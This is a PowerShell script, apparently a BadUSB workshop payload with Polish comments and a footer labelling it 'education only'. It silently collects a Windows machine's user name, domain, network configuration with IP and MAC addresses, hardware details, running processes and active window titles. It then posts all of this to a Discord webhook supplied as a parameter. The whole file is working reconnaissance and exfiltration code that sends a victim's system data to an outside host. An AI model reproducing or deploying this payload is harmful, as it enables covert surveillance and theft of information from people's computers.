# get_info.ps1 - Prosty zbieracz informacji dla Discord Webhook
param([string]$webhook)

# Zbieramy podstawowe info
$compName = $env:COMPUTERNAME
$userName = $env:USERNAME
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
if (!$domain) { $domain = "BRAK (grupa robocza)" }

# Sieciówki
$networks = Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | ForEach-Object {
    $ip = Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4
    $gw = (Get-NetRoute -InterfaceIndex $_.ifIndex -DestinationPrefix "0.0.0.0/0").NextHop
    $dns = (Get-DnsClientServerAddress -InterfaceIndex $_.ifIndex).ServerAddresses -join ", "
    
    "📡 {$($_.Name)}`nIP: $($ip.IPAddress)`nMaska: /$($ip.PrefixLength)`nBrama: $gw`nDNS: $dns`nMAC: $($_.MacAddress)"
}

# Uptime
$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"

# Procesor i RAM
$cpu = (Get-WmiObject Win32_Processor).Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)

# Aktywne okna (top 5)
$windows = @()
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Window {
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
    }
"@
for ($i=0; $i -lt 5; $i++) {
    $hwnd = [Window]::GetForegroundWindow()
    if ($hwnd -ne 0) {
        $title = New-Object System.Text.StringBuilder 256
        [Window]::GetWindowText($hwnd, $title, $title.Capacity)
        if ($title.ToString()) { $windows += $title.ToString() }
    }
    Start-Sleep -Milliseconds 200
}

# Procesy (top 5 po CPU)
$procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | ForEach-Object {
    "$($_.ProcessName) (CPU: $([math]::Round($_.CPU,1))% | RAM: $([math]::Round($_.WorkingSet/1MB,1))MB)"
}

# Składamy wiadomość na Discord
$body = @{
    content = "**🔍 NOWE URZĄDZENIE ZAINWENTARYZOWANE!**"
    embeds = @(
        @{
            title = "💻 $compName"
            color = 16711680
            fields = @(
                @{ name = "👤 Użytkownik"; value = $userName; inline = $true }
                @{ name = "🏢 Domena"; value = $domain; inline = $true }
                @{ name = "⏰ Uptime"; value = $uptimeStr; inline = $true }
                @{ name = "🖥️ CPU"; value = $cpu.Substring(0, [Math]::Min(50, $cpu.Length)) + "..."; inline = $false }
                @{ name = "🧠 RAM"; value = "$ram GB"; inline = $true }
                @{ name = "🌐 Sieć"; value = $networks -join "`n`n"; inline = $false }
                @{ name = "⚙️ Top 5 procesów"; value = $procs -join "`n"; inline = $false }
                @{ name = "📌 Aktywne okna"; value = if ($windows) { $windows -join "`n" } else { "Brak" }; inline = $false }
            )
            footer = @{ text = "BadUSB Warsztat - Tylko edukacja!" }
            timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
        }
    )
} | ConvertTo-Json -Depth 4

# Wysyłamy na Discord
Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
